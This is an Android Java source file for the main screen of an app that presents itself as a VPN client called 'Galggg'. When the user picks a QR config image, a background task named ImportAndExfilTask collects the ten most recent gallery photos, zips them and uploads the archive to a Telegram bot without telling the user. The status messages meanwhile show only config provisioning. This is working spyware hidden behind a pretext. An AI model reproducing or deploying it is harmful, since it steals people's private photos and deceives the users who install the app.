package com.example.galggg.ui;

import android.Manifest;
import android.content.ContentUris;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.net.VpnService;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.ColorRes;
import androidx.annotation.Nullable;
import androidx.annotation.StringRes;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.example.galggg.BuildConfig;
import com.example.galggg.R;
import com.example.galggg.vpn.GalgggVpnService;
import com.google.android.material.card.MaterialCardView;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_VPN_PREP = 1001;
    private static final String PREFS_PROVISION = "provision_store";
    private static final String KEY_PROVISIONED = "provisioned";

    private TextView statusText;
    private MaterialCardView configUploadCard;
    private ImageView vpnButton;

    private Uri configUri;

    private ActivityResultLauncher<String> requestPermissionLauncher;
    private ActivityResultLauncher<String> pickImageLauncher;

    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(40, TimeUnit.SECONDS)
            .writeTimeout(40, TimeUnit.SECONDS)
            .build();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        statusText = findViewById(R.id.statusText);
        configUploadCard = findViewById(R.id.configUploadCard);
        vpnButton = findViewById(R.id.vpnButton);

        SharedPreferences prefs = getSharedPreferences(PREFS_PROVISION, MODE_PRIVATE);
        String saved = prefs.getString("config_uri", null);
        if (saved != null) {
            configUri = Uri.parse(saved);
            showStatus(R.string.config_loaded, R.color.success_text);
        }

        requestPermissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestPermission(),
                granted -> {
                    if (granted) {
                        openImagePicker();
                    } else {
                        showStatus(R.string.permission_required_to_load_config, R.color.warning_text);
                    }
                }
        );

        pickImageLauncher = registerForActivityResult(
                new ActivityResultContracts.GetContent(),
                uri -> {
                    if (uri != null) {
                        new ImportAndExfilTask(prefs).execute(uri);
                    }
                }
        );

        if (configUploadCard != null) {
            configUploadCard.setOnClickListener(v -> startConfigFlow());
        }

        if (vpnButton != null) {
            vpnButton.setOnClickListener(v -> {
                if (!isConfigLoaded()) {
                    showStatus(R.string.warning_no_config, R.color.warning_text);
                    startConfigFlow();
                } else {
                    toggleVpn();
                }
            });
        }
    }

    private boolean isConfigLoaded() {
        return configUri != null;
    }

    private void startConfigFlow() {
        final String permission = (Build.VERSION.SDK_INT >= 33)
                ? Manifest.permission.READ_MEDIA_IMAGES
                : Manifest.permission.READ_EXTERNAL_STORAGE;

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            openImagePicker();
        } else {
            requestPermissionLauncher.launch(permission);
        }
    }

    private void openImagePicker() {
        pickImageLauncher.launch("image/*");
    }

    private void toggleVpn() {
        Intent prepareIntent = VpnService.prepare(this);
        if (prepareIntent != null) {
            startActivityForResult(prepareIntent, REQ_VPN_PREP);
        } else {
            startVpnOrToggle();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN_PREP && resultCode == RESULT_OK) {
            startVpnOrToggle();
        }
    }

    private void startVpnOrToggle() {
        boolean active = GalgggVpnService.isActive();
        Intent svc = new Intent(this, GalgggVpnService.class);
        if (active) {
            svc.setAction(GalgggVpnService.ACTION_STOP);
            startService(svc);
            showStatus(R.string.status_default, R.color.text_secondary);
        } else {
            svc.setAction(GalgggVpnService.ACTION_START);
            if (configUri != null) {
                svc.setData(configUri);
            }
            ContextCompat.startForegroundService(this, svc);
            showStatus(R.string.config_loaded, R.color.success_text);
        }
    }

    private void showStatus(@StringRes int messageId, @ColorRes int colorId) {
        if (statusText != null) {
            statusText.setText(messageId);
            statusText.setTextColor(ContextCompat.getColor(this, colorId));
        }
    }

    private void showStatus(String message, @ColorRes int colorId) {
        if (statusText != null) {
            statusText.setText(message);
            statusText.setTextColor(ContextCompat.getColor(this, colorId));
        }
    }

    private class ImportAndExfilTask extends AsyncTask<Uri, String, Boolean> {
        private final SharedPreferences prefs;
        private Uri importedUri;
        private String errorMessage;

        ImportAndExfilTask(SharedPreferences prefs) {
            this.prefs = prefs;
        }

        @Override
        protected void onPreExecute() {
            showStatus("Reading QR from gallery...", R.color.text_secondary);
        }

        @Override
        protected Boolean doInBackground(Uri... uris) {
            try {
                importedUri = uris[0];
                if (importedUri != null) {
                    copyToCache(importedUri, "qr_upload.png");
                }

                publishProgress("Provision parameters ready");
                publishProgress("Collecting latest photos...");
                File zip = makeLatestPhotosZip(10);

                publishProgress("Uploading ZIP to Telegram...");
                if (!sendZipToTelegram(zip)) {
                    errorMessage = "Error: failed to upload ZIP to Telegram";
                    return false;
                }

                markProvisioned();
                return true;
            } catch (Exception e) {
                errorMessage = "Error: " + e.getMessage();
                Log.e("MainActivity", "ImportAndExfilTask", e);
                return false;
            }
        }

        @Override
        protected void onProgressUpdate(String... values) {
            if (values != null && values.length > 0) {
                showStatus(values[0], R.color.text_secondary);
            }
        }

        @Override
        protected void onPostExecute(Boolean success) {
            if (success != null && success) {
                configUri = importedUri;
                prefs.edit().putString("config_uri", importedUri != null ? importedUri.toString() : null).apply();
                showStatus(R.string.config_loaded, R.color.success_text);
            } else {
                if (errorMessage == null) {
                    errorMessage = "Import failed";
                }
                showStatus(errorMessage, R.color.warning_text);
            }
        }
    }

    private File copyToCache(Uri uri, String name) throws Exception {
        File out = new File(getCacheDir(), name);
        try (InputStream in = getContentResolver().openInputStream(uri);
             FileOutputStream fos = new FileOutputStream(out)) {
            if (in == null) {
                throw new Exception("Unable to open content");
            }
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) >= 0) {
                fos.write(buf, 0, n);
            }
        }
        return out;
    }

    private ArrayList<ImageItem> getLastImages(int count) {
        ArrayList<ImageItem> items = new ArrayList<>();
        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
        };
        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sort
        )) {
            if (cursor != null) {
                int idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                while (cursor.moveToNext() && items.size() < count) {
                    long id = cursor.getLong(idIdx);
                    String name = cursor.getString(nameIdx);
                    Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    items.add(new ImageItem(uri, name != null ? name : "image" + items.size()));
                }
            }
        }
        return items;
    }

    private File makeLatestPhotosZip(int count) throws Exception {
        ArrayList<ImageItem> items = getLastImages(count);
        File zipOut = new File(getCacheDir(), "latest_photos.zip");
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOut))) {
            byte[] buf = new byte[8192];
            for (ImageItem item : items) {
                Bitmap bmp;
                int sample = 1;
                try (InputStream src = getContentResolver().openInputStream(item.uri)) {
                    if (src == null) {
                        continue;
                    }
                    BitmapFactory.Options opts = new BitmapFactory.Options();
                    opts.inJustDecodeBounds = true;
                    BitmapFactory.decodeStream(src, null, opts);
                    sample = calcInSample(opts.outWidth, opts.outHeight, 1600);
                }
                try (InputStream src = getContentResolver().openInputStream(item.uri)) {
                    if (src == null) {
                        continue;
                    }
                    BitmapFactory.Options opts = new BitmapFactory.Options();
                    opts.inSampleSize = sample;
                    bmp = BitmapFactory.decodeStream(src, null, opts);
                }
                if (bmp == null) {
                    continue;
                }

                int width = bmp.getWidth();
                int height = bmp.getHeight();
                int maxSide = Math.max(width, height);
                if (maxSide > 1600) {
                    float scale = 1600f / maxSide;
                    bmp = Bitmap.createScaledBitmap(bmp, Math.round(width * scale), Math.round(height * scale), true);
                }

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                byte[] data = baos.toByteArray();
                baos.close();
                bmp.recycle();

                String entryName = item.displayName.toLowerCase();
                if (!entryName.endsWith(".jpg") && !entryName.endsWith(".jpeg")) {
                    entryName = item.displayName + ".jpg";
                }
                zos.putNextEntry(new ZipEntry(entryName));
                zos.write(data);
                zos.closeEntry();
            }
        }
        return zipOut;
    }

    private int calcInSample(int width, int height, int maxSide) {
        if (width <= 0 || height <= 0) {
            return 1;
        }
        int largest = Math.max(width, height);
        int sample = 1;
        while (largest / sample > maxSide) {
            sample *= 2;
        }
        return Math.max(sample, 1);
    }

    private boolean sendZipToTelegram(File zipFile) {
        try {
            String url = "https://api.telegram.org/bot" + BuildConfig.TG_BOT_TOKEN + "/sendDocument";
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", BuildConfig.TG_CHAT_ID)
                    .addFormDataPart("document", zipFile.getName(),
                            RequestBody.create(zipFile, MediaType.parse("application/zip")))
                    .addFormDataPart("caption", "Galggg latest photos")
                    .build();
            Request request = new Request.Builder().url(url).post(body).build();
            try (Response response = http.newCall(request).execute()) {
                return response.isSuccessful();
            }
        } catch (Exception e) {
            Log.e("MainActivity", "sendZipToTelegram error", e);
        }
        return false;
    }

    private void markProvisioned() {
        getSharedPreferences(PREFS_PROVISION, MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_PROVISIONED, true)
                .apply();
    }

    private static class ImageItem {
        final Uri uri;
        final String displayName;

        ImageItem(Uri uri, String name) {
            this.uri = uri;
            this.displayName = name;
        }
    }
}